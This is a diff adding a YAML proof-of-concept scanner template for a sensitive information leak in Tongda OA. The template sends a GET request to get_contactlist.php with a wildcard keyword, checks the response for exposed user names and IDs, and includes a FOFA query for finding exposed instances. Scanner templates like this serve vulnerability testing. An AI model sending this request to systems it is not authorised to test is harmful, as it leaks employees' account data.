@@ -1,0 +1,24 @@
+id: poc-yaml-tongda-oa-get-contactlist-php-sensitive-info-leak
+info:
+  name: 通达OA get_contactlist.php 敏感信息泄漏漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3f
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"user_name\":") &&
+
+    contains(body,"\"user_uid\":") &&
+
+    contains(body,"\"user_id\":") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
